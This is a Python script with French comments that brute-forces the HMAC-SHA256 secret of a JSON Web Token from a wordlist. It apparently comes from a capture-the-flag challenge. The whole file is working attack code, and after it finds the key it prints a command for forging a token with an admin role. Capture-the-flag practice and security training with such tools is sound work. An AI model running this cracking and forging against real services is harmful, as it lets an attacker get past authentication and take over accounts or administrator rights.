#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script de brute-force pour retrouver la clé HMAC d'un JWT
Usage: python3 brutef_secret.py <token> <wordlist>
"""

import sys
import jwt
import time
from colorama import Fore, Style, init

# Initialiser colorama
init(autoreset=True)

def print_banner():
    """Affiche la bannière du script"""
    banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
║              JWT HMAC Secret Brute-Forcer                             ║
║                  Kinjutsu CTF                                         ║
╚═══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)


def decode_jwt_header(token):
    """Décode le header du JWT sans vérifier la signature"""
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        
        print(f"{Fore.YELLOW}[*] Informations du JWT:{Style.RESET_ALL}")
        print(f"    Algorithm: {header.get('alg', 'N/A')}")
        print(f"    Type: {header.get('typ', 'N/A')}")
        print(f"\n{Fore.YELLOW}[*] Payload (non vérifié):{Style.RESET_ALL}")
        for key, value in payload.items():
            print(f"    {key}: {value}")
        print()
        
        return header.get('alg', 'HS256')
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur lors du décodage du JWT: {e}{Style.RESET_ALL}")
        return None


def brute_force_secret(token, wordlist_file):
    """Brute-force la clé secrète HMAC"""
    print(f"{Fore.YELLOW}[*] Chargement de la wordlist: {wordlist_file}{Style.RESET_ALL}")
    
    try:
        with open(wordlist_file, 'r', encoding='utf-8') as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Fichier wordlist introuvable: {wordlist_file}{Style.RESET_ALL}")
        return None
    
    print(f"{Fore.YELLOW}[*] {len(wordlist)} mots chargés{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Début du brute-force...\n{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    for secret in wordlist:
        attempts += 1
        
        # Afficher la progression tous les 100 essais
        if attempts % 100 == 0:
            print(f"{Fore.BLUE}[*] Tentatives: {attempts}/{len(wordlist)}{Style.RESET_ALL}", end='\r')
        
        try:
            # Essayer de décoder le JWT avec ce secret
            jwt.decode(token, secret, algorithms=["HS256"])
            
            # Si on arrive ici, c'est que la signature est valide !
            elapsed = time.time() - start_time
            
            print(f"\n\n{Fore.GREEN}{'='*60}")
            print(f"[✓] SECRET TROUVÉ !")
            print(f"{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Clé HMAC: {Fore.WHITE}{secret}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Tentatives: {attempts}/{len(wordlist)}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Temps écoulé: {elapsed:.2f} secondes{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
            
            return secret
            
        except jwt.InvalidSignatureError:
            # Signature invalide, on continue
            continue
        except jwt.ExpiredSignatureError:
            # Token expiré mais signature valide !
            elapsed = time.time() - start_time
            
            print(f"\n\n{Fore.GREEN}{'='*60}")
            print(f"[✓] SECRET TROUVÉ (token expiré mais signature valide) !")
            print(f"{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Clé HMAC: {Fore.WHITE}{secret}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Tentatives: {attempts}/{len(wordlist)}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Temps écoulé: {elapsed:.2f} secondes{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Note: Le token est expiré mais la signature est correcte{Style.RESET_ALL}")
            print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
            
            return secret
        except Exception:
            # Autre erreur, on continue
            continue
    
    elapsed = time.time() - start_time
    print(f"\n\n{Fore.RED}[!] Secret non trouvé après {attempts} tentatives{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Temps écoulé: {elapsed:.2f} secondes{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Essayez une wordlist plus complète{Style.RESET_ALL}\n")
    
    return None


def main():
    """Fonction principale"""
    print_banner()
    
    if len(sys.argv) != 3:
        print(f"{Fore.RED}Usage: {sys.argv[0]} <token_jwt> <wordlist_file>{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Exemple:{Style.RESET_ALL}")
        print(f"  python3 {sys.argv[0]} 'eyJhbGc...' wordlist.txt\n")
        sys.exit(1)
    
    token = sys.argv[1]
    wordlist_file = sys.argv[2]
    
    # Décoder le header pour info
    algorithm = decode_jwt_header(token)
    
    if algorithm and algorithm != 'HS256':
        print(f"{Fore.YELLOW}[!] Attention: L'algorithme détecté est {algorithm}, pas HS256{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Ce script est optimisé pour HS256{Style.RESET_ALL}\n")
    
    # Lancer le brute-force
    secret = brute_force_secret(token, wordlist_file)
    
    if secret:
        print(f"{Fore.GREEN}[+] Vous pouvez maintenant utiliser ce secret pour forger un nouveau token !{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Exemple avec forge_hs256.py:{Style.RESET_ALL}")
        print(f"    python3 forge_hs256.py '{secret}' '{{\"user\":\"mond\",\"role\":\"admin\"}}'\n")
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == '__main__':
    main()
